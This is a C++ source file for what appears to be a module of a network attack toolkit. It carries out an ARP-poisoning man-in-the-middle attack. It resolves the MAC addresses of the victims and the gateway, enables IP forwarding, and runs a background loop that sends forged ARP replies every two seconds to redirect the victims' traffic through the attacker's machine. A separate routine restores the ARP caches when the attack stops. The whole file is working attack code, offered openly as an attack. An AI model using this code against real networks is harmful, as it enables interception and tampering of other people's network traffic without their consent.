#include "MitmGlobal.hh"

MitmGlobal::MitmGlobal(Core &core, std::ostream *out, const std::vector<std::string> &victimsIp, const std::string &gatewayIp)
    : AModule(core, "MitmGlobal", out), _run(false)
{
    Addresses       addr;

    _gateway.ip(IPv4Address(gatewayIp));
    _gateway.mac(_core.arpRequest(_gateway.ip()));

    for (std::string ip : victimsIp)
    {
        addr.ip(IPv4Address(ip));
        addr.mac(_core.arpRequest(addr.ip()));
        _victims.push_back(addr);
    }

    // Enable ip forwarding
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");

    *_out << "Start MitmGlobal";
}

void MitmGlobal::poison(void)
{
    // Start poisoning arp tables
    _run = true;
    while (_run)
    {
        for (Addresses victim : _victims)
        {
            // Tell gateway thats _victim.ip() is _attackerMac
            _core.arpReply(victim.ip(), _core.mac(), _gateway.ip(), _gateway.mac());
            // Tell victim thats _gateway.ip() is _attackerMac
            _core.arpReply(_gateway.ip(), _core.mac(), victim.ip(), victim.mac());
        }
        // Don't need to spam
        sleep(2);
    }
}

void MitmGlobal::start(void)
{
    std::thread     t(&MitmGlobal::poison, this);

    t.detach();
}

void MitmGlobal::stop(void)
{
    _run = false;

    sleep(3);
    // Disable ip forward
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");

    // Restore arp cache
    for (Addresses victim : _victims)
    {
        for (int i = 0; i < 2; i++)
        {
            // Tell gateway thats _victim.ip() is _victim.mac()
            _core.arpReply(victim.ip(), victim.mac(), _gateway.ip(), _gateway.mac());
            // Tell victim thats _gateway.ip() is _gateway.mac()
            _core.arpReply(_gateway.ip(), _gateway.mac(), victim.ip(), victim.mac());
        }
    }
}

std::string MitmGlobal::info(void)
{
    std::stringstream   ss;

    ss << "Victims : " << _victims.size() << " && Gateway ip : " << _gateway.ip();
    return ss.str();
}

std::string MitmGlobal::help(void)
{
    std::string     rep;

    rep += "Start a global man in the middle attack by arp poisoning.\n";
    rep += "\tOptions : <file> <gatewayIp>";
    return rep;
}
